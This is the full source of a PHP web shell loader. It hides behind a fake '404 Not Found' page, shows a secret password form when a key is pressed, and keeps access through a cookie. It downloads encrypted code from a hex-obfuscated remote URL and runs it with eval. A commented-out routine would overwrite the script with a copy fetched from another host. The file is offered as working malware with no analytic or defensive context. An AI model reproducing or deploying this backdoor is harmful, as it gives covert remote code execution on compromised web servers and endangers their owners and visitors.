//<?php
init();
class Crypt
{
    static function encrypt($str, $key, $toBase64 = false)
    {
        $r = md5(uniqid());
        $c = 0;
        $v = "";
        $len = strlen($str);
        $l = strlen($r);
        for ($i = 0; $i < $len; $i++) {
            if ($c == $l)
                $c = 0;
            $v .= substr($r, $c, 1) . (substr($str, $i, 1) ^ substr($r, $c, 1));
            $c++;
        }
        if ($toBase64) {
            return gzcompress(self::ed($v, $key));
        } else {
            return self::ed($v, $key);
        }

    }
    static function decrypt($str, $key, $toBase64 = false)
    {
        if ($toBase64) {
            $str = self::ed(gzuncompress($str), $key);
        } else {
            $str = self::ed($str, $key);
        }
        $v = "";
        $len = strlen($str);
        for ($i = 0; $i < $len; $i++) {
            $md5 = substr($str, $i, 1);
            $i++;
            $v .= (substr($str, $i, 1) ^ $md5);
        }
        return $v;
    }
    static function ed($str, $key)
    {
        $r = md5($key);
        $c = 0;
        $v = "";
        $len = strlen($str);
        $l = strlen($r);
        for ($i = 0; $i < $len; $i++) {
            if ($c == $l)
                $c = 0;
            $v .= substr($str, $i, 1) ^ substr($r, $c, 1);
            $c++;
        }
        return $v;
    }
}
function init()
{  
     //update
     /****
     if (!defined("debug") && filesize($_SERVER["SCRIPT_FILENAME"]) != "371") {
        $name = basename($_SERVER["SCRIPT_FILENAME"]);
        $txt = gzuncompress(_REQUEST(pack('H*',
            '687474703a2f2f323031326865696b652e676f6f676c65636f64652e636f6d2f73766e2f7472756e6b2f6d696e692e686b')));
        if (true == @file_put_contents($name, $txt)) {
            header("location:" . $name);
        }
    }
    ***/
    session_start();
    set_time_limit(0);
    ini_set('memory_limit', -1);
    /***
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {
        header("HTTP/1.1 404 Not Found");
        header("Status: 404 Not Found");
        exit();
    }
    ***/
    $login = <<< HTML
   <!DOCTYPE HTML>
<head>
	<meta http-equiv="content-type" content="text/html" />
	<meta name="author" content="Steve Smith" />
    <meta http-equiv="content-type" charset="UTF-8" />
	<title>404 Not Found</title>
    <style>
    input{font:11px Verdana;BACKGROUND:#FFFFFF;height:18px;border:1px solid #666666;}
    #login{display:none;}
    </style>
</head>
<body>
   <div id="notice" style="position:fixed;right:0;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;display: none; font-size:12px;"></div>
   <div id="login">
   <form action="" method="POST">
   <span style="font:11px Verdana;">
       Password: 
     </span>
     <input id="pwd" name="pwd" type="password" size="20" />
     <input id="submit" type="button" value="login" />
   </form>
  </div>
<script>
function $(d) {
	return document.getElementById(d)
}
function sideOut(t) {
    if(t==null) t=1500;
	window.setTimeout(display, t);
	function display() {
		$("notice").style.display = "none"
	}
}
$("submit").onclick = function() {
		var pwd = $("pwd").value;
		var options = {};
		options.url = '{self}';
		options.listener = callback;
		options.method = 'POST';
		var request = XmlRequest(options);
		request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
		if (pwd) request.send('pwd=' + pwd);
        else{
            $("notice").style['display']='block';
            $("notice").innerHTML='DATA-ERROR';
            sideOut();
        }
	}
function XmlRequest(options) {
	var req = false;
	if (window.XMLHttpRequest) {
		var req = new XMLHttpRequest()
	} else if (window.ActiveXObject) {
		var req = new window.ActiveXObject('Microsoft.XMLHTTP')
	}
	if (!req) return false;
	req.onreadystatechange = function() {
		if (req.readyState == 4 && req.status == 200) {
			options.listener.call(req)
		}
	};
	req.open(options.method, options.url, true);
	return req
}
function callback() {
	var json = eval("(" + this.responseText + ")");
    if (json.status=='on'){
        window.location.reload();
        return;
    }
	if (json.notice) {
		$("notice").style.display = "block";
		$("notice").innerHTML = json.notice;
        sideOut();
	}
}
document.onkeydown = function(e) {
		    var theEvent = window.event || e;      
            var code = theEvent.keyCode || theEvent.which; 
			if (80 == code) {
				$("login").style.display = "block"
			}
		}
</script>
</body>
</html>
HTML;
    if ($_POST['pwd'] == true) {
        $true = @gzuncompress(gzuncompress(Crypt::decrypt(pack('H*',
            '789c63d4e5680efdc93c917d65d497f04f219b98cf339d0e3dc01bcb3a23a48a5736808ddd8d5d203094551b0032e00d2c'),
            $_POST['pwd'], true)));
        if ('true' == $true) {
            setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);
            exit('{"status":"on"}');
        } else {
            exit('{"notice":"API-ERROR"}');
        }
    }
    if ($_COOKIE['key'] == true) {
        $true = @gzuncompress(gzuncompress(Crypt::decrypt(pack('H*',
            '789c63d4e5680efdc93c917d65d497f04f219b98cf339d0e3dc01bcb3a23a48a5736808ddd8d5d203094551b0032e00d2c'),
            $_COOKIE['key'], true)));
        if ('true' == $true) {
            if ($_SESSION['code'] == null) {
                $_SESSION['code'] = _REQUEST(sprintf("%s?%s",pack("H*",'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f636f64652e6a7067'),uniqid()));
            } else {
                $_SESSION['code'] = $_SESSION['code'];
            }
            eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_COOKIE['key'], true))));
        }
    }
    if ($_COOKIE['key'] == null) {
        echo str_replace('{self}', $_SERVER["SCRIPT_NAME"], $login);
        exit();
    }
}

function _Content($fsock = null)
{
    $out = null;
    while ($buff = @fgets($fsock, 2048)) {
        $out .= $buff;
    }
    fclose($fsock);
    $pos = strpos($out, "\r\n\r\n");
    $head = substr($out, 0, $pos); //http head
    $status = substr($head, 0, strpos($head, "\r\n")); //http status line
    $body = substr($out, $pos + 4, strlen($out) - ($pos + 4)); //page body
    if (preg_match("/^HTTP\/\d\.\d\s([\d]+)\s.*$/", $status, $matches)) {
        if (intval($matches[1]) / 100 == 2) {
            return $body;
        } else {
            return false;
        }
    } else {
        return false;
    }
}

function _REQUEST($url)
{
    $url2 = parse_url($url);
    $fsock_timeout = 30; //5 second
    if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout)) < 0) {
        return false;
    }
    $request = $url2["path"];
    $in = "GET " . $request . " HTTP/1.1\r\n";
    $in .= "Accept: */*\r\n";
    $in .= "User-Agent: E/1.0 EBSD\r\n";
    $in .= "Host: " . $url2["host"] . "\r\n";
    $in .= "Connection: Close\r\n\r\n";
    if (!@fwrite($fsock, $in, strlen($in))) {
        fclose($fsock);
        return false;
    }
    return _Content($fsock);
}
// ?>